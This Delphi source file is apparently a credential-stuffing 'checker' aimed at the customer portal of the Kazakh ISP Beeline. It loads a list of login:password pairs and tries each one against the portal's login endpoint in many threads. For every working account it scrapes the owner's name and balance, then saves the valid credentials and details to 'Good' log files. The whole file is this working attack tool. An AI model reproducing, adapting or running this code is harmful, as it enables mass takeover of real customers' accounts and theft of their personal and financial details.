unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.Samples.Spin,
  Vcl.Samples.Gauges, Vcl.ComCtrls, Vcl.ExtCtrls, RegExpr, ssl_openssl,
  httpsend, System.SyncObjs,
  IdBaseComponent, IdComponent, IdIOHandler, IdIOHandlerSocket,
  IdIOHandlerStack, IdSSL, IdSSLOpenSSL;

type
  TForm1 = class(TForm)
    Panel1: TPanel;
    Panel2: TPanel;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    Panel3: TPanel;
    Panel4: TPanel;
    AllAccount: TLabel;
    GoodLabel: TLabel;
    ErrorLabel: TLabel;
    BadLabel: TLabel;
    Panel5: TPanel;
    Panel6: TPanel;
    ListView1: TListView;
    Panel7: TPanel;
    Gauge1: TGauge;
    Panel8: TPanel;
    OpenDialog1: TOpenDialog;
    Button4: TButton;
    Label5: TLabel;
    ReBruteLabel: TLabel;
    Panel9: TPanel;
    Label9: TLabel;
    Label10: TLabel;
    Thread1: TSpinEdit;
    TimeOut: TSpinEdit;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

  ThePotok = class(TThread)
  private
    Login, Password, Owner, Balans, Rebrute: String;
    Data: TStringStream;
    Reg: TRegeXpr;
    Scr, ReBruteHtml: TStringList;
    Rez: Integer;
  protected
    procedure Execute; override;
  public
    procedure Sync;
  End;

var
  Form1: TForm1;
  AccountsList: TStringList;
  Cs: TCriticalSection;
  Work: Boolean;
  Acc, Thread, CurAcc: Integer;
  GoodFileLogs, GoodFile, BadFile, RebruteFile: TextFile;

implementation

{$R *.dfm}

{ ThePotok }
function Pars(T_, ForS, _T: string): string;
var
  a, b: Integer;
begin
  Result := '';
  if (T_ = '') or (ForS = '') or (_T = '') then
    Exit;
  a := Pos(T_, ForS);
  if a = 0 then
    Exit
  else
    a := a + Length(T_);
  ForS := Copy(ForS, a, Length(ForS) - a + 1);
  b := Pos(_T, ForS);
  if b > 0 then
    Result := Copy(ForS, 1, b - 1);
end;

procedure ThePotok.Execute;
Var
  Http: THTTPSend;
begin
  While Work do
  Begin
    Cs.Enter;
    Inc(Acc);
    if Acc < AccountsList.Count then
      CurAcc := Acc
    else
      Work := False;
    Cs.Leave;
    if Work then
    begin
      Http := THTTPSend.Create;
      Rez := 0;
      if Pos(':', AccountsList[CurAcc]) <> 0 then
      Begin
        Login := Copy(AccountsList[CurAcc], 1,
          Pos(':', AccountsList[CurAcc]) - 1);
        Password := Copy(AccountsList[CurAcc], Pos(':', AccountsList[CurAcc]) +
          1, Length(AccountsList[CurAcc]));
      End
      else
      Begin
        Login := Copy(AccountsList[CurAcc], 1,
          Pos(';', AccountsList[CurAcc]) - 1);
        Password := Copy(AccountsList[CurAcc], Pos(';', AccountsList[CurAcc]) +
          1, Length(AccountsList[CurAcc]));
      End;
      Data := TStringStream.Create;
      Scr := TStringList.Create;
      ReBruteHtml := TStringList.Create;
      With Http Do
      Begin
        TimeOut := Form1.TimeOut.Value * 1000;
        Headers.Add
          ('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
        Headers.Add('Accept-Encoding: gzip, deflate, br');
        UserAgent :=
          'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0';
        MimeType := 'application/x-www-form-urlencoded';
        Document.Clear;
      End;
      Data.WriteString('AuthData.Login=' + Login + '&AuthData.Password=' +
        Password + '');
      Http.Document.LoadFromStream(Data);
      ReBruteHtml.LoadFromStream(Http.Document);
      if Http.HTTPMethod('POST', 'https://my.internet.beeline.kz/ru/Account')
      then
        if Pos('Location: /', Http.Headers.Text) <> 0 then
        begin
          Http.Clear;
          Http.HTTPMethod('GET',
            'https://my.internet.beeline.kz/ru/cabinet/internet/services');
          Scr.LoadFromStream(Http.Document);
          Owner := Pars('class="name">', Utf8ToAnsi(Scr.Text), '</div>');
          Balans := Pars
            ('<span id="BalanceSpan" style="font-weight: bold; color: Black;">',
            Utf8ToAnsi(Scr.Text), '</span>');
          Rez := 1;
        end
        else
        begin
          Rez := 2;
        end;
    end;
    Http.Free;
    Scr.Free;
    Synchronize(Sync);
  End;
  Dec(Thread);
End;

procedure ThePotok.Sync;
var
  Item: TListItem;
begin
  case Rez of

    1:
      Begin
        Append(GoodFileLogs);
        Append(GoodFile);
        WriteLn(GoodFileLogs, Login + ':' + Password + '');
        WriteLn(GoodFile, Login + ':' + Password + ''); // Good accs not logs
        WriteLn(GoodFileLogs, 'Balans: ' + Trim(Balans) + '');
        WriteLn(GoodFileLogs, 'Owner: ' + Trim(Owner) + '');
        WriteLn(GoodFileLogs, '••••••••••••••••••••••••');
        CloseFile(GoodFileLogs);
        CloseFile(GoodFile);
        Item := Form1.ListView1.Items.Add;
        Item.Caption := Login;
        Item.SubItems.Add(Password);
        Item.SubItems.Add(Balans);
        Item.SubItems.Add(Owner);
        Form1.GoodLabel.Caption :=
          IntToStr(StrToInt(Form1.GoodLabel.Caption) + 1);
      End;

    2:
      Begin
        Append(BadFile);
        WriteLn(BadFile, Login + ':' + Password);
        CloseFile(BadFile);
        Form1.BadLabel.Caption :=
          IntToStr(StrToInt(Form1.BadLabel.Caption) + 1);
      End;

    0:
      Begin
        Form1.ErrorLabel.Caption :=
          IntToStr(StrToInt(Form1.ErrorLabel.Caption) + 1);
      End;

  End;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Cs.Free;
  Application.Terminate;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  AccountsList := TStringList.Create;
  Cs := TCriticalSection.Create;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  if OpenDialog1.Execute then
  Begin
    AccountsList.LoadFromFile(OpenDialog1.FileName);
    AllAccount.Caption := IntToStr(AccountsList.Count);
  End;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  if (AllAccount.Caption <> '0') then
  begin
    ListView1.Clear;
    CreateDir(ExtractFilePath(Application.ExeName) + ('Beeline Soft'));
    CreateDir(ExtractFilePath(Application.ExeName) +
      ('Beeline Soft\' + DateToStr(Date) + ''));
    Assignfile(GoodFileLogs, ExtractFilePath(Application.ExeName) +
      'Beeline Soft\' + DateToStr(Date) + '\Good_Logs (' + DateToStr(Time)
      + ').txt');
    Rewrite(GoodFileLogs);
    CloseFile(GoodFileLogs);
    Assignfile(GoodFile, ExtractFilePath(Application.ExeName) + 'Beeline Soft\'
      + DateToStr(Date) + '\Good (' + DateToStr(Time) + ').txt');
    Rewrite(GoodFile);
    CloseFile(GoodFile);
    Assignfile(BadFile, ExtractFilePath(Application.ExeName) + 'Beeline Soft\' +
      DateToStr(Date) + '\Bad (' + DateToStr(Time) + ').txt');
    Rewrite(BadFile);
    CloseFile(BadFile);
    Assignfile(RebruteFile, ExtractFilePath(Application.ExeName) +
      'Beeline Soft\' + DateToStr(Date) + '\ReBrute (' + DateToStr(Time)
      + ').txt');
    Rewrite(RebruteFile);
    CloseFile(RebruteFile);
    BadLabel.Caption := '0';
    GoodLabel.Caption := '0';
    ReBruteLabel.Caption := '0';
    ErrorLabel.Caption := '0';
    Acc := -1;
    Work := true;
    for Thread := 1 to Thread1.Value do
      ThePotok.Create(False);
    Thread1.Enabled := False;
    TimeOut.Enabled := False;
    Button1.Enabled := False;
    Button2.Enabled := False;
    Button3.Enabled := true;
    Button4.Enabled := true;
    Form1.CheckBox2.Enabled := False;
  end
  else
    Application.MessageBox('Вы не загрузили лист с аккаунтами!', 'Ошибка',
      MB_OK + MB_ICONSTOP);

end;

procedure TForm1.Button3Click(Sender: TObject);
begin
  Work := False;
  AccountsList.Clear;
  AllAccount.Caption := '0';
  Thread1.Enabled := true;
  TimeOut.Enabled := true;
  Button1.Enabled := true;
  Button2.Enabled := true;
  Form1.CheckBox2.Enabled := true;
  Button3.Enabled := False;
  Button4.Enabled := False;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
  if Form1.Button4.Caption = 'Pause' then
  begin
    Form1.Button4.Caption := 'Resume';
    Thread1.Enabled := true;
    TimeOut.Enabled := true;
    Form1.CheckBox2.Enabled := true;
  end
  else
  begin
    Form1.Button4.Caption := 'Pause';
    Thread1.Enabled := False;
    TimeOut.Enabled := False;
    Form1.CheckBox2.Enabled := False;
  end;

end;

end.
